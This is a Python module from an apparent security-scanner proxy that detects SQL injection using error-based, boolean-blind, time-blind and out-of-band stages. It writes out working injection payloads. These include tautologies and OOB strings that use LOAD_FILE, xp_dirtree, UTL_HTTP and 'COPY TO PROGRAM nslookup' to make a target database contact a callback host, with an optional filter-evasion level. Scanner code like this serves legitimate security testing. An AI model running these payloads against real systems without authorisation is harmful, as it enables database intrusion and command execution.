import logging
import time
from typing import Optional

import httpx

from pwnproxy.plugins.core.base import Finding
from pwnproxy.plugins.core.chain import DetectionDepth, DetectionStage, StageResult
from pwnproxy.shared.models import Flow
from pwnproxy.shared.scan.params import InjectionPoint
from pwnproxy.shared.scan.replayer import RequestReplayer
from pwnproxy.shared.canary import get_registry

logger = logging.getLogger(__name__)


class ErrorBasedStage(DetectionStage):
    order = 0
    min_depth = DetectionDepth.FAST

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        from pwnproxy.plugins.scanners.sqli.payloads import get_error_payloads
        from pwnproxy.plugins.scanners.sqli.detector import ERROR_SIGNATURES

        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            for payload in get_error_payloads():
                resp = await self._replayer.replay(point, payload.value, timeout=3.0, evasion_level=self._evasion)
                if resp is None:
                    continue
                result = _check_error_signatures(resp.text, ERROR_SIGNATURES)
                if result is not None:
                    dbms, evidence = result
                    findings.append(Finding(
                        scanner="sqli",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="error-based",
                        severity="high",
                        confidence="confirmed",
                        payload=payload.value,
                        evidence=evidence,
                        extra={"dbms": dbms},
                    ))
                    confirmed.add(_point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)


class BooleanBlindStage(DetectionStage):
    order = 1
    min_depth = DetectionDepth.STANDARD

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        true_payloads = [
            "' OR 1=1-- ",
            "' OR '1'='1'-- ",
            "' OR 1=1#",
        ]
        false_payloads = [
            "' AND 1=0-- ",
            "' AND '1'='2'-- ",
            "' AND 1=0#",
        ]

        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            clean = await self._replayer.send_clean(point, timeout=10.0)
            if clean is None:
                continue
            clean_len = len(clean.text)

            for true_p, false_p in zip(true_payloads, false_payloads):
                true_resp = await self._replayer.replay(point, true_p, timeout=5.0, evasion_level=self._evasion)
                false_resp = await self._replayer.replay(point, false_p, timeout=5.0, evasion_level=self._evasion)
                if true_resp is None or false_resp is None:
                    continue

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)
                diff = abs(true_len - false_len)

                if diff > 10:
                    findings.append(Finding(
                        scanner="sqli",
                        url=point.url,
                        method=point.method,
                        param_name=point.name,
                        param_location=point.location,
                        technique="boolean-blind",
                        severity="medium",
                        confidence="tentative",
                        payload=true_p,
                        evidence=f"Response length diff: TRUE={true_len}, FALSE={false_len} (diff={diff})",
                    ))
                    confirmed.add(_point_key(point))
                    break

        return StageResult(findings=findings, confirmed_points=confirmed)


class TimeBlindStage(DetectionStage):
    order = 2
    min_depth = DetectionDepth.STANDARD

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        from pwnproxy.plugins.scanners.sqli.payloads import TIME_PAYLOADS

        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        for point in injection_points:
            start = time.monotonic()
            clean = await self._replayer.send_clean(point, timeout=10.0)
            baseline_ms = (time.monotonic() - start) * 1000
            if clean is None:
                continue

            result = await _check_time_based(self._replayer, point, baseline_ms, TIME_PAYLOADS, self._evasion)
            if result is not None:
                finding, dbms = result
                finding.extra["dbms"] = dbms
                findings.append(finding)
                confirmed.add(_point_key(point))

        return StageResult(findings=findings, confirmed_points=confirmed)


class OOBStage(DetectionStage):
    order = 3
    min_depth = DetectionDepth.DEEP

    def __init__(self, replayer: RequestReplayer, evasion_level: str = "none"):
        self._replayer = replayer
        self._evasion = evasion_level

    async def execute(self, flow: Flow, injection_points: list[InjectionPoint]) -> StageResult:
        findings: list[Finding] = []
        confirmed: set[tuple] = set()

        registry = get_registry()

        for point in injection_points:
            scan_id = f"sqli-oob-{flow.id}-{point.name}"
            canary = registry.create(scan_id)
            callback_url = f"http://oob.pwnproxy/{canary.token}"

            payloads = [
                f"' OR LOAD_FILE('\\\\{callback_url}\\x')-- ",
                f"'; DECLARE @q VARCHAR(8000); EXEC master.dbo.xp_dirtree '\\\\{callback_url}\\x';-- ",
                f"' OR COPY (SELECT '') TO PROGRAM 'nslookup {callback_url}'-- ",
                f"' OR UTL_HTTP.request('{callback_url}')-- ",
            ]

            for payload_text in payloads:
                resp = await self._replayer.replay(point, payload_text, timeout=10.0, evasion_level=self._evasion)
                if resp is None:
                    continue

            import asyncio
            await asyncio.sleep(2)

            hit = registry.get(canary.token)
            if hit and hit.callback_received:
                findings.append(Finding(
                    scanner="sqli",
                    url=point.url,
                    method=point.method,
                    param_name=point.name,
                    param_location=point.location,
                    technique="oob",
                    severity="high",
                    confidence="confirmed",
                    payload=payloads[0],
                    evidence=f"OOB callback received from {hit.callback_ip}",
                    extra={"dbms": "multi", "oob_token": canary.token},
                ))
                confirmed.add(_point_key(point))

            registry.cleanup_expired()

        return StageResult(findings=findings, confirmed_points=confirmed)


def _point_key(point: InjectionPoint) -> tuple:
    return (point.method, point.host + point.path, point.name, point.location)


def _check_error_signatures(body: str, signatures: dict[str, list]) -> Optional[tuple[str, str]]:
    import re
    for dbms, patterns in signatures.items():
        for pat in patterns:
            m = pat.search(body)
            if m:
                return (dbms, m.group()[:500])
    return None


async def _check_time_based(
    replayer: RequestReplayer,
    point: InjectionPoint,
    baseline_ms: float,
    time_payloads: list,
    evasion_level: str = "none",
) -> Optional[tuple[Finding, str]]:
    seen_dbms: set[str] = set()
    for pl in time_payloads:
        if pl.dbms in seen_dbms:
            continue
        seen_dbms.add(pl.dbms)

        start = time.monotonic()
        resp = await replayer.replay(point, pl.value, timeout=15.0, evasion_level=evasion_level)
        elapsed = (time.monotonic() - start) * 1000
        if resp is None:
            continue
        if elapsed > baseline_ms + 4000:
            confirm_payloads = [p for p in time_payloads if p.dbms == pl.dbms and "3" in p.value]
            for confirm_pl in confirm_payloads:
                cstart = time.monotonic()
                cresp = await replayer.replay(point, confirm_pl.value, timeout=15.0, evasion_level=evasion_level)
                celapsed = (time.monotonic() - cstart) * 1000
                if cresp is None:
                    return (
                        Finding(
                            scanner="sqli", url=point.url, method=point.method,
                            param_name=point.name, param_location=point.location,
                            technique="time-based-blind", severity="medium", confidence="tentative",
                            payload=pl.value,
                            evidence=f"Primary delay ({elapsed:.0f}ms vs baseline {baseline_ms:.0f}ms) but confirmation failed",
                        ),
                        pl.dbms or "unknown",
                    )
                if celapsed > baseline_ms + 2400:
                    return (
                        Finding(
                            scanner="sqli", url=point.url, method=point.method,
                            param_name=point.name, param_location=point.location,
                            technique="time-based-blind", severity="high", confidence="confirmed",
                            payload=pl.value,
                            evidence=f"Delay: baseline={baseline_ms:.0f}ms, primary={elapsed:.0f}ms, confirm={celapsed:.0f}ms",
                        ),
                        pl.dbms or "unknown",
                    )
            return (
                Finding(
                    scanner="sqli", url=point.url, method=point.method,
                    param_name=point.name, param_location=point.location,
                    technique="time-based-blind", severity="medium", confidence="tentative",
                    payload=pl.value,
                    evidence=f"Primary delay ({elapsed:.0f}ms) but confirmation below threshold",
                ),
                pl.dbms or "unknown",
            )
    return None
